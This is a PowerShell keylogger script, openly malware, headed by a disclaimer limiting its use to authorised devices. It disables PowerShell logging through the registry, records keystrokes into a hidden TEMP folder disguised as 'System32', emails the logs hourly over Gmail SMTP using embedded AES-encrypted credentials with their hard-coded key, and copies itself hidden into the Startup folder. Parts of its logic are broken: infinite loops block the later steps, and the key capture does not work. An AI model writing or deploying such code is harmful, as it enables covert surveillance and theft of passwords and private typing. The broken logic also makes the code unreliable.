# ONLY USE THIS ON DEVICES OWNED BY YOU OR DEVICES YOU HAVE BEEN GIVEN PERMISSION TO TEST THIS ON
# IM NOT RESPONSIBLE FOR ANY 'TROUBLES' CAUSED BY THIS SCRIPT

# Encrypted credentials (Base64 strings)
$encryptedPassword = "UUYXbM6Nx0TdBHoO7SdnG0u83QhXjyWfq+ggBhwXn84="
$encryptedUsername = "IZt8Rx0xRG5dmyQlRs2ih3v4ZG9uKgYYApOky7uRpX2pg4aLy6KgLBIOed9fBprV"

# Define the same static key and IV used for encryption
$key = "LTZCMq0jHzoTxw@8$tqYHeVM*s#c^y8u"
$iv = "uA3CBJ*RE#HJhKXY"

# Convert key and IV to byte arrays
$keyBytes = [Text.Encoding]::UTF8.GetBytes($key)
$ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)

# Function to decrypt AES-encrypted credentials
function Decrypt-AES {
    param (
        [string]$encryptedData
    )

    # Convert base64-encoded encrypted data to byte array
    $encryptedDataBytes = [Convert]::FromBase64String($encryptedData)

    # Create AES decryption object
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes

    # Decrypt the data
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedDataBytes, 0, $encryptedDataBytes.Length)
    $decryptedString = [Text.Encoding]::UTF8.GetString($decryptedBytes)

    return $decryptedString
}

# Decrypt the username and password
$smtpUsername = Decrypt-AES $encryptedUsername
$smtpPassword = Decrypt-AES $encryptedPassword

# Hide PowerShell logging
try {
    Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0
    Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -Name 'EnableTranscripting' -Value 0
} catch {}

# Load necessary assemblies for keylogging
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.IO.Compression

# Global variable to store keys
$global:keys = ""

# Function to start keylogging
function Start-KeyLogger {
    while ($true) {
        Start-Sleep -Milliseconds 10
        $key = [System.Windows.Forms.Control]::ModifierKeys
        if ($key -ne 0) {
            $global:keys += "[$key] "
        }
        $global:keys += [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
    }
}

# Function to save keystrokes to a hidden file
function Save-Keys {
    $logPath = "$env:TEMP\System32\updateLogs.txt"  # Hidden folder in TEMP
    if (-not (Test-Path $logPath)) {
        New-Item -Path "$env:TEMP\System32" -ItemType Directory -Force  # Create hidden folder
        attrib +h "$env:TEMP\System32"
    }
    $global:keys | Out-File -FilePath $logPath -Append
    $global:keys = ""
}

# Function to send logs via email using SMTP
function Send-Logs {
    $smtpServer = "smtp.gmail.com"
    $smtpFrom = $smtpUsername
    $smtpTo = "recipient_email@gmail.com"  # Replace with the recipient's email
    $messageSubject = "Keylogger Logs"
    $messageBody = "Attached are the key logs for the past hour."
    $logPath = "$env:TEMP\System32\updateLogs.txt"
    
    $smtp = New-Object Net.Mail.SmtpClient($smtpServer, 587)
    $smtp.EnableSsl = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUsername, $smtpPassword)
    
    $message = New-Object Net.Mail.MailMessage($smtpFrom, $smtpTo, $messageSubject, $messageBody)
    $attachment = New-Object Net.Mail.Attachment($logPath)
    $message.Attachments.Add($attachment)
    
    try {
        $smtp.Send($message)
    } catch {
        # Handle any errors with email sending
    }
}

# Schedule the keylogger to run indefinitely and send logs every hour
Start-KeyLogger
while ($true) {
    Start-Sleep -Seconds 3600  # Wait for 1 hour
    Save-Keys
    Send-Logs
}

# Hide the keylogger script in TEMP folder
$scriptPath = "$env:TEMP\keylogger.ps1"
attrib +h $scriptPath

# Add the keylogger to startup (hidden)
Copy-Item $scriptPath -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.ps1"
attrib +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.ps1"
